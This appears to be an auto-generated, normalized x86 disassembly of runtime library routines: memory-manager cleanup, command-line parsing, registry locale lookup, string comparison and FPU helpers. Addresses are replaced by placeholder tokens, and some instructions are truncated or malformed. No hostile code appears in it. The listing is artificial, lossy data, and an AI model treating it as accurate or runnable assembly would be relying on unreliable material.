pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1b809 ] 0x0
xor eax eax
mov [ ebp - 0x1b818 ] eax
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
lea edx [ ebp - 0x27824 ]
mov eax [ rw-data ]
call sub_446a04
mov ebx eax
mov [ ebp - 0x1b810 ] 0x37
mov [ ebp - 0x1b820 ] rw-data
lea eax [ ebp - 0x1b004 ]
mov [ ebp - 0x1b824 ] eax
mov eax ebx
add eax 0x10
call sub_446c28
test al al
jne r-xdata
and esi 0xfffffff0
sub esi 0x4
mov [ ebp - 0x1b814 ] esi
mov eax ebx
call sub_446c28
test al al
jne r-xdata
mov eax [ ebp - 0x1b81c ]
mov [ ebp - 0x1b818 ] eax
add [ ebp - 0x1b824 ] 0x800
add [ ebp - 0x1b820 ] 0x20
dec [ ebp - 0x1b810 ]
jne r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov ebx [ ebx + 0x4 ]
mov [ ebp - 0x1b801 ] 0x0
mov esi [ ebx + 0xc ]
and esi 0xfffffff0
sub esi 0x4
sub esi 0x10
mov eax [ ebp - 0x1b808 ]
mov [ ebp + eax * 4 - 0x1f824 ] esi
inc [ ebp - 0x1b808 ]
mov [ ebp - 0x1b801 ] 0x0
mov eax [ ebp - 0x1b808 ]
mov edx [ ebp - 0x1b814 ]
mov [ ebp + eax * 4 - 0x1f824 ] edx
inc [ ebp - 0x1b808 ]
mov eax [ ebp - 0x1b820 ]
movzx eax [ eax ]
sub eax 0x4
mov [ ebp - 0x1b81c ] eax
mov [ ebp - 0x1b80a ] 0x0
mov edi 0xff
mov eax [ ebp - 0x1b824 ]
mov esi eax
cmp [ ebp - 0x1b808 ] 0x0
jle r-xdata
dec edi
sub esi 0x8
cmp edi 0xffffffff
jne r-xdata
cmp [ ebp - 0x1b809 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
push 0x2010
mov eax [ rw-data ]
push eax
lea eax [ ebp - 0x27824 ]
push eax
push 0x0
call MessageBoxA
cmp [ ebp - 0x1b809 ] 0x0
je r-xdata
lea eax [ ebp - 0x20025 ]
cmp ebx eax
ja r-xdata
cmp [ ebp - 0x1b80a ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
mov ebx eax
mov [ ebp - 0x1b809 ] 0x1
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
mov ebx eax
mov esi [ ebp - 0x1b808 ]
dec esi
test esi esi
jb r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov eax [ ebp - 0x1b818 ]
inc eax
mov edx ebx
call sub_4468e8
mov ebx eax
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x2d
inc ebx
mov [ ebx ] 0x20
inc ebx
mov edx ebx
mov eax [ ebp - 0x1b81c ]
call sub_4468e8
mov ebx eax
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
mov ebx eax
mov [ ebp - 0x1b80a ] 0x1
jmp r-xdata
inc esi
xor edi edi
lea eax [ ebp - 0x1f824 ]
mov [ ebp - 0x1b824 ] eax
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
mov ebx eax
jmp r-xdata
je r-xdata
mov eax edi
sub eax 0x1
jb r-xdata
mov eax [ ebp - 0x1b824 ]
mov eax [ eax ]
mov edx ebx
call sub_4468e8
mov ebx eax
lea eax [ ebp - 0x20025 ]
cmp ebx eax
ja r-xdata
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x78
inc ebx
mov [ ebx ] 0x20
inc ebx
mov eax [ esi ]
mov edx ebx
call sub_4468e8
mov ebx eax
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
mov ebx eax
jmp r-xdata
dec eax
je r-xdata
inc edi
add [ ebp - 0x1b824 ] 0x4
dec esi
jne r-xdata
mov eax [ rw-data ]
call sub_44964c
mov ecx eax
mov edx ebx
mov eax [ rw-data ]
call sub_446a04
mov ebx eax
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
mov edx ebx
call sub_446a1c
mov ebx eax
sub_447224
push esi
push edi
xor eax eax
xor esi esi
mov edx rw-data
movzx edi [ edx ]
shr edi 0x3
mov ecx esi
add ecx ecx
add ecx ecx
cmp edi eax
jbe r-xdata
test [ edx ] 0xf
jne r-xdata
mov eax edi
mov [ eax + rw-data ] cl
inc eax
cmp edi eax
ja r-xdata
inc esi
add edx 0x20
cmp esi 0x37
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
retn
sub_447268
push ebx
push esi
push edi
mov esi 0x37
mov ebx rw-data
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x8 ] eax
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x18 ] eax
xor eax eax
mov [ ebx - 0x10 ] eax
mov [ ebx - 0x14 ] 0x1
movzx eax [ ebx - 0x1a ]
add eax eax
add eax eax
lea eax [ eax + eax * 2 ]
add eax 0xef
and eax 0xffffff00
add eax 0x30
cmp eax 0xb30
jae r-xdata
mov [ ebx ] sub_445b14
add eax 0x4d0
shr eax 0xd
cmp eax 0x7
jbe r-xdata
mov eax 0xb30
mov ecx eax
mov dl 0xff
shl dl cl
mov [ ebx - 0x1b ] dl
shl eax 0xd
add ax 0xb30
mov [ ebx - 0x4 ] ax
movzx edi [ ebx - 0x1a ]
movzx eax di
mov ecx eax
shl ecx 0x4
lea ecx [ ecx + ecx * 2 ]
add ecx 0xef
and ecx 0xffffff00
add ecx 0x30
cmp ecx 0x7330
jae r-xdata
mov eax 0x7
cmp ecx 0xff30
jbe r-xdata
mov ecx 0x7330
mov eax ecx
sub eax 0x20
movzx edx di
mov ecx edx
xor edx edx
div ecx
imul di
add ax 0xef
and ax 0xff00
add ax 0x30
mov [ ebx - 0x2 ] ax
add ebx 0x20
dec esi
jne r-xdata
mov ecx 0xff30
cmp [ ebx ] 0x0
jne r-xdata
call sub_447224
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
mov esi 0x400
mov edx rw-data
mov eax edx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add edx 0x8
dec esi
jne r-xdata
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
pop edi
pop esi
pop ebx
retn
sub_447390
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi [ ebx + 0x4 ]
jmp r-xdata
cmp edi ebx
jne r-xdata
mov ebp [ edi + 0x4 ]
push 0x8000
push 0x0
push edi
call VirtualFree
mov edi ebp
mov edx 0x37
mov eax rw-data
mov ecx eax
mov [ eax + 0x14 ] ecx
mov ecx eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
xor ecx ecx
mov [ eax + 0xc ] ecx
add eax 0x20
dec edx
jne r-xdata
mov [ ebx ] ebx
mov [ ebx + 0x4 ] ebx
mov edx 0x400
mov ecx rw-data
mov eax ecx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add ecx 0x8
dec edx
jne r-xdata
mov ebx [ esi + 0x4 ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebx + 0x4 ]
push 0x8000
push 0x0
push ebx
call VirtualFree
mov ebx edi
mov [ esi ] esi
mov [ esi + 0x4 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_447420
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_446e40
call sub_447390
retn
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call VirtualFree
xor eax eax
mov [ rw-data ] eax
sub_4474c0
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_447670
mov [ ecx ] eax
mov al 0x2
jmp sub_447670
retn
mov [ ecx ] eax
retn
sub_447538
mov eax rw-data
mov edx sub_445f80
cmp edx [ eax ]
jne r-xdata
mov al 0x1
retn
mov edx sub_446304
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx sub_4464fc
cmp edx [ eax + 0x8 ]
jne r-xdata
mov edx sub_446814
cmp edx [ eax + 0xc ]
jne r-xdata
mov edx sub_446be8
cmp edx [ eax + 0x10 ]
jne r-xdata
mov edx sub_446c28
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
sub_4475c0
push ebx
call sub_4015fc
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
xor ebx ebx
mov ebx [ eax + 0x8 ]
xor edx edx
mov [ eax + 0x8 ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call [ rw-data ]
jmp r-xdata
sub_447624
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x1a
ja r-xdata
call sub_4015fc
mov ebx [ eax + 0x14 ]
jmp r-xdata
movzx eax bl
mov edx esi
call sub_447618
movzx eax bl
movzx ebx [ eax + rw-data ]
sub_4476cc
cmp eax edx
je r-xdata
retn
cmp ecx 0x20
ja r-xdata
jle r-xdata
sub ecx 0x8
jg r-xdata
retn
cmp eax edx
ja r-xdata
fild [ ecx + eax ]
fild [ eax ]
cmp ecx 0x8
jle r-xdata
jmp [ ecx * 4 + r-xdata ]
push edx
fild [ eax ]
lea eax [ ecx + eax - 0x8 ]
lea ecx [ edx + ecx - 0x8 ]
fild [ eax ]
push ecx
neg ecx
and edx 0xfffffff8
lea ecx [ edx + ecx + 0x8 ]
pop edx
sub edx ecx
cmp eax edx
lea edx [ ecx + edx ]
jbe r-xdata
fistp [ edx ]
fistp [ ecx + edx ]
fild [ eax + 0x8 ]
cmp ecx 0x10
jle r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
add ecx 0x8
jl r-xdata
fistp [ edx ]
pop edx
fistp [ edx ]
retn
sub ecx 0x8
push ecx
fild [ ecx + eax ]
fild [ eax ]
add ecx edx
and ecx 0xfffffff8
sub ecx edx
fistp [ edx + 0x8 ]
fild [ eax + 0x10 ]
fistp [ edx + 0x10 ]
fild [ ecx + eax ]
fistp [ ecx + edx ]
sub ecx 0x8
jg r-xdata
pop ecx
fistp [ edx ]
fistp [ ecx + edx ]
sub_4477cc
push ebx
push esi
push edi
push ebp
mov ebx edx
jmp r-xdata
movzx edx [ eax ]
test dx dx
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
cmp dx 0x20
jbe r-xdata
xor edi edi
mov esi eax
jmp r-xdata
cmp [ eax + 0x2 ] 0x22
jne r-xdata
add eax 0x2
movzx ebp [ eax ]
cmp bp 0x20
ja r-xdata
add eax 0x4
jmp r-xdata
cmp bp 0x22
jne r-xdata
mov eax ebx
mov edx edi
call sub_449fd0
mov eax esi
mov esi [ ebx ]
xor ecx ecx
jmp r-xdata
inc edi
add eax 0x2
add eax 0x2
jmp r-xdata
movzx edi [ eax ]
cmp di 0x20
ja r-xdata
movzx edx [ eax ]
test dx dx
je r-xdata
cmp di 0x22
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax ] 0x0
je r-xdata
cmp dx 0x22
jne r-xdata
mov [ esi + ecx * 2 ] di
add eax 0x2
inc ecx
add eax 0x2
jmp r-xdata
add eax 0x2
jmp r-xdata
inc edi
add eax 0x2
movzx edx [ eax ]
test dx dx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp dx 0x22
jne r-xdata
add eax 0x2
jmp r-xdata
mov [ esi + ecx * 2 ] dx
add eax 0x2
inc ecx
sub_447888
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_4478d9
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
call GetCommandLineW
lea edx [ ebp - 0x4 ]
call sub_4477cc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4478e0
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
inc esi
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4477cc
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4478e8
push ebx
push esi
push edi
add esp 0xfffffdf4
mov ebx edx
mov esi eax
mov eax ebx
xor edx edx
call sub_449d2c
test esi esi
jne r-xdata
call GetCommandLineW
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call GetModuleFileNameW
mov ecx eax
mov edx esp
mov eax ebx
call sub_449e68
jmp r-xdata
add esp 0x20c
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4477cc
mov edi eax
test esi esi
je r-xdata
sub_44796c
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_4479ac
push ebx
movzx ecx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44769c
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_447a00
push ebx
push esi
mov ebx eax
xor esi esi
movzx eax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_44769c
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_44769c
jmp r-xdata
sub_447a58
push ebx
movzx ebx [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
movzx ecx cl
xchg edx eax
call sub_4476cc
pop ebx
retn
mov ecx ebx
sub_447a74
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_447ae4
cmp edx 0x20
mov ch cl
jl r-xdata
test edx edx
jle r-xdata
mov [ eax ] cx
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x6 ] cx
sub edx 0x10
fld [ eax ]
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
mov ecx eax
and ecx 0x7
sub ecx 0x8
sub eax ecx
add edx ecx
add eax edx
neg edx
retn
mov [ edx + eax - 0x1 ] cl
and edx 0xfffffffe
neg edx
lea edx [ edx * 2 + r-xdata ]
jmp edx
fst [ edx + eax ]
fst [ edx + eax + 0x8 ]
add edx 0x10
jl r-xdata
ffree st0
fincstp
retn
mov [ eax + 0x1c ] cx
mov [ eax + 0x1a ] cx
mov [ eax + 0x18 ] cx
mov [ eax + 0x16 ] cx
mov [ eax + 0x14 ] cx
mov [ eax + 0x12 ] cx
mov [ eax + 0x10 ] cx
mov [ eax + 0xe ] cx
mov [ eax + 0xc ] cx
mov [ eax + 0xa ] cx
mov [ eax + 0x8 ] cx
mov [ eax + 0x6 ] cx
mov [ eax + 0x4 ] cx
mov [ eax + 0x2 ] cx
mov [ eax ] cx
retn
sub_447b80
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
add esi 0x2
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
add esi 0x2
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
shr esi 0x1
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
add esi 0x2
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
add esi 0x2
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
add esi 0x2
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
add esi 0x2
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
add esi 0x2
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_447c6c
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_447d1f ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_447d1f ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_447d1f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_447f50
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_447f80
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call RegOpenKeyExW
test eax eax
jne r-xdata
movzx eax [ rw-data ]
and ax 0xffc0
movzx edx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_447ff1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call RegQueryValueExW
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call RegCloseKey
retn
sub_4480a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_44812d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_448088
lea eax [ ebp - 0x4 ]
call sub_4494ec
call sub_449fc4
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
lea eax [ ebp - 0x8 ]
call sub_4494ec
call sub_449fc4
push eax
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push 0x1
mov eax [ rw-data ]
push eax
call CompareStringW
cmp eax 0x2
sete bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448134
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
sub_4481bc
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x34 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x30 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x54 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_448214
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_44a798
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x4c ]
mov esi [ esi - 0x30 ]
test edx edx
je r-xdata
mov eax ebx
call sub_44874c
pop esi
pop ebx
retn
sub_44823c
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_44b8f0
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_448278
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4482fc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_44830c
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448303
lea eax [ ebp - 0x8 ]
call sub_44b8d8
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_44823c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_44b8f0
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_44830c
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x54 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_448350
push ebx
push esi
push edi
mov esi edx
call sub_44843c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
xor edx edx
call sub_449d2c
mov edi ebx
mov eax edi
add eax 0x2
inc edi
movzx edx [ edi ]
add eax edx
add eax 0xa
mov edx esi
call sub_44be14
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_448388
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_448428
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4483c8
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x3c ]
test edi edi
je r-xdata
mov esi [ esi - 0x30 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_4483f8
push eax
push ecx
mov eax [ eax ]
call sub_4483c8
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_449288
call [ rw-data ]
sub_448410
push esi
mov esi edx
mov eax [ eax ]
call sub_4483c8
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_449288
call [ rw-data ]
sub_44846c
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_4483c8
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_448494
push ebx
push esi
add esp 0xfffffc00
mov ebx edx
push 0x100
lea edx [ esp + 0x4 ]
push edx
movzx edx [ eax ]
push edx
inc eax
push eax
push 0x0
push 0xfde9
call MultiByteToWideChar
mov esi eax
push 0x100
lea eax [ esp + 0x204 ]
push eax
movzx eax [ ebx ]
push eax
lea eax [ ebx + 0x1 ]
push eax
push 0x0
push 0xfde9
call MultiByteToWideChar
mov ebx eax
push ebx
lea eax [ esp + 0x204 ]
push eax
push esi
lea eax [ esp + 0xc ]
push eax
push 0x1
mov eax [ rw-data ]
push eax
call CompareStringW
cmp eax 0x2
sete al
add esp 0x400
pop esi
pop ebx
retn
sub_448520
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x40 ]
test esi esi
je r-xdata
mov eax [ eax - 0x30 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
push eax
push edx
lea eax [ esi + 0x6 ]
call sub_448494
xor ecx ecx
test al al
pop edx
pop eax
je r-xdata
xor bl [ ecx + edx ]
test bl 0x80
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ edx ]
jmp r-xdata
jmp r-xdata
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
dec ecx
jne r-xdata
mov bl [ ecx + esi + 0x6 ]
test bl 0x80
jne r-xdata
sub_44858c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_44bc1c
mov edx esp
mov eax ebx
call sub_448520
add esp 0x100
pop esi
pop ebx
retn
sub_4485b4
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
xor ecx ecx
jmp r-xdata
mov esi [ eax - 0x40 ]
test esi esi
je r-xdata
mov eax [ eax - 0x30 ]
test eax eax
jne r-xdata
